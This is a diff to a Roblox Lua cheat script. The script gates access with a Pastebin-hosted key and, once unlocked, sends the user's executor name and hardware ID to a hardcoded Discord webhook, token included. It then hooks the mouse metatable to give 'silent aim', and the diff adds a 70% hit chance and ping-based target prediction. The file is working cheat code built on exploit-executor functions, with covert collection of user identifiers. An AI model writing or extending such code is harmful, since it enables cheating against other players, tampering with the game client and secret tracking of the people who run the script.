@@ -1,9 +1,12 @@
--- Roblox Services
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
+local Lighting = game:GetService("Lighting")
+local Workspace = game:GetService("Workspace")
+local RunService = game:GetService("RunService")
+
 local LocalPlayer = Players.LocalPlayer
 
--- Get key from Pastebin
+-- Get Key from Pastebin
 local correctKey = nil
 pcall(function()
 	local req = syn and syn.request or http_request or request
@@ -16,10 +19,11 @@ pcall(function()
 	end
 end)
 
--- UI Setup
+-- UI
 local gui = Instance.new("ScreenGui", game.CoreGui)
 gui.Name = "KeySystem"
-local blur = Instance.new("BlurEffect", game.Lighting)
+
+local blur = Instance.new("BlurEffect", Lighting)
 blur.Size = 10
 
 local frame = Instance.new("Frame", gui)
@@ -71,24 +75,8 @@ getKey.TextSize = 14
 getKey.BorderSizePixel = 0
 Instance.new("UICorner", getKey).CornerRadius = UDim.new(0, 6)
 
--- "Copied!" popup
-local copiedText = Instance.new("TextLabel", frame)
-copiedText.Size = UDim2.new(1, 0, 0, 20)
-copiedText.Position = UDim2.new(0, 0, 1, -15)
-copiedText.Text = "Copied to clipboard!"
-copiedText.TextColor3 = Color3.fromRGB(0, 255, 0)
-copiedText.Font = Enum.Font.Gotham
-copiedText.TextSize = 14
-copiedText.TextTransparency = 1
-copiedText.BackgroundTransparency = 1
-
--- Button Logic
 getKey.MouseButton1Click:Connect(function()
-	setclipboard("https://pastebin.com/raw/xk1wzKjP")
-	copiedText.TextTransparency = 0
-	task.delay(2, function()
-		copiedText.TextTransparency = 1
-	end)
+    setclipboard("https://pastebin.com/raw/xk1wzKjP")
 end)
 
 submit.MouseButton1Click:Connect(function()
@@ -98,9 +86,10 @@ submit.MouseButton1Click:Connect(function()
 		gui:Destroy()
 		blur:Destroy()
 
-		-- Load silent aim and log to Discord
-		local camera = workspace.CurrentCamera
+		-- === Webhook Logging ===
+		local camera = Workspace.CurrentCamera
 		local mouse = LocalPlayer:GetMouse()
+
 		local webhook = "https://discord.com/api/webhooks/1385113796963598356/px_zeWfFa2yDChxhrX1t1KR-yLy6_253oVRu0NAxNm8MifIs6WZK6WuRe2qGaN1nfpow"
 		local executor = identifyexecutor and identifyexecutor() or "Unknown"
 		local hwid = (syn and syn.gethwid and syn.gethwid()) or (gethwid and gethwid()) or "Unavailable"
@@ -117,9 +106,9 @@ submit.MouseButton1Click:Connect(function()
 					}
 				}}
 			}
-			local req = syn and syn.request or request or http_request
-			if req then
-				req({
+			local request = request or http_request or syn and syn.request
+			if request then
+				request({
 					Url = webhook,
 					Method = "POST",
 					Headers = {["Content-Type"] = "application/json"},
@@ -128,7 +117,7 @@ submit.MouseButton1Click:Connect(function()
 			end
 		end)
 
-		local Drawing = Drawing
+		-- === Silent Aim ===
 		local fovCircle = Drawing.new("Circle")
 		fovCircle.Visible = true
 		fovCircle.Filled = false
@@ -138,7 +127,7 @@ submit.MouseButton1Click:Connect(function()
 		fovCircle.Color = Color3.fromRGB(0, 255, 0)
 		fovCircle.Transparency = 1
 
-		game:GetService("RunService").RenderStepped:Connect(function()
+		RunService.RenderStepped:Connect(function()
 			fovCircle.Position = Vector2.new(mouse.X + 1, mouse.Y + 36)
 		end)
 
@@ -157,11 +146,20 @@ submit.MouseButton1Click:Connect(function()
 			rayParams.FilterDescendantsInstances = {LocalPlayer.Character}
 			rayParams.FilterType = Enum.RaycastFilterType.Blacklist
 			rayParams.IgnoreWater = true
-			local result = workspace:Raycast(origin, direction, rayParams)
+			local result = Workspace:Raycast(origin, direction, rayParams)
 			if result and result.Instance then
 				return part:IsDescendantOf(result.Instance:FindFirstAncestorOfClass("Model"))
 			end
 			return false
+		end
+
+		local function getPing()
+			local ping = LocalPlayer:GetNetworkPing()
+			return ping and ping / 1000 or 0.1 -- fallback to 100ms
+		end
+
+		local function shouldHit()
+			return math.random() <= 0.7 -- 70% hit chance
 		end
 
 		local function getClosestPart()
@@ -191,19 +189,22 @@ submit.MouseButton1Click:Connect(function()
 
 		mt.__index = function(t, k)
 			if t == mouse and (k == "Target" or k == "Hit") then
-				if math.random() < 0.25 then -- 25% chance to aim (75% miss)
+				if shouldHit() then
 					local target = getClosestPart()
 					if target then
+						local ping = getPing()
+						local predictedPos = target.Position + target.Velocity * ping
+						local predictedCFrame = CFrame.new(predictedPos)
 						if k == "Target" then return target end
-						if k == "Hit" then return target.CFrame end
+						if k == "Hit" then return predictedCFrame end
 					end
 				end
-				return nil
 			end
 			return oldIndex(t, k)
 		end
 
 		setreadonly(mt, true)
+
 	else
 		LocalPlayer:Kick("❌ Invalid key.")
 	end
